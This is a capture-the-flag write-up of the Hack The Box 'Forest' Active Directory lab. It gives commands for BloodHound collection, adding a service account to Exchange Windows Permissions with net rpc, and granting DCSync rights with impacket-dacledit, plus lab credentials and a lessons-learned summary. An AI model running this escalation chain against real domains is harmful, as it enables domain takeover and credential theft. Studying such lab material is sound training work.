# HTB Forest

> **Platform:** Hack The Box
> **OS:** Windows Server 2016 (Active Directory, with Exchange)
> **Domain:** `htb.local` — host `FOREST` (`FOREST.htb.local`)
> **Difficulty:** Easy

> **Note on the target IP:** the box was reset mid-session (`10.129.95.210` → `10.129.75.229`). Substitute your own.

## Attack Path Overview

1. **Recon** – DC; LDAP allows a null bind.
2. **User enumeration** – null LDAP lists all domain users, including the service account `svc-alfresco`.
3. **AS-REP Roasting** – `svc-alfresco` has pre-auth disabled; crack → `s3rvice` → WinRM foothold + user flag.
4. **BloodHound → DCSync** – `svc-alfresco` is in **Account Operators**, so it can add itself to **Exchange Windows Permissions**, which holds **WriteDACL** on the domain → grant itself **DCSync** → dump the Administrator hash → Pass-the-Hash.

## 5. BloodHound → DCSync chain

Collect AD data (fix the domain flag — it's `htb.local`, not any pasted default):

```bash
netexec ldap 10.129.95.210 -u 'svc-alfresco' -p 's3rvice' --bloodhound --collection All --dns-server 10.129.95.210
# or:
bloodhound-python -u 'svc-alfresco' -p 's3rvice' -d htb.local -ns 10.129.95.210 -c All
```

BloodHound reveals: `svc-alfresco` ∈ **Account Operators** → can manage non-protected groups → add itself to **`Exchange Windows Permissions`**, which has **WriteDACL** on the domain object → grant itself **DCSync**.

### Step 5.1 — Add `svc-alfresco` to Exchange Windows Permissions

Add the DC to `/etc/hosts` first (`<DC IP> htb.local`), then:

```bash
net rpc group addmem "Exchange Windows Permissions" "svc-alfresco" -U "htb.local"/"svc-alfresco"%"s3rvice" -S "htb.local"
# verify:
net rpc group members "Exchange Windows Permissions" -U "htb.local"/"svc-alfresco"%"s3rvice" -S "htb.local"
```

> If the verify doesn't list your user, re-run the `addmem` then `members` again until it shows.

### Step 5.2 — Grant DCSync via WriteDACL

```bash
impacket-dacledit -action 'write' -rights 'DCSync' -principal 'svc-alfresco' -target-dn 'DC=htb,DC=local' 'htb.local'/'svc-alfresco':'s3rvice'
```

> If it fails, re-check the group membership (the `members` command) and re-add if needed before retrying.

## Lessons Learned

- **Null LDAP binds** on a DC can dump the full user list with zero credentials — seed AS-REP roasting from it.
- **Service accounts with pre-auth disabled** (`svc-alfresco`) are the classic Forest foothold.
- **Account Operators is dangerous**: it can modify non-protected groups. Adding yourself to **Exchange Windows Permissions** (WriteDACL on the domain) lets you grant yourself **DCSync** — the canonical Forest privesc.
- **DCSync → Pass-the-Hash** the Administrator NT hash to finish.
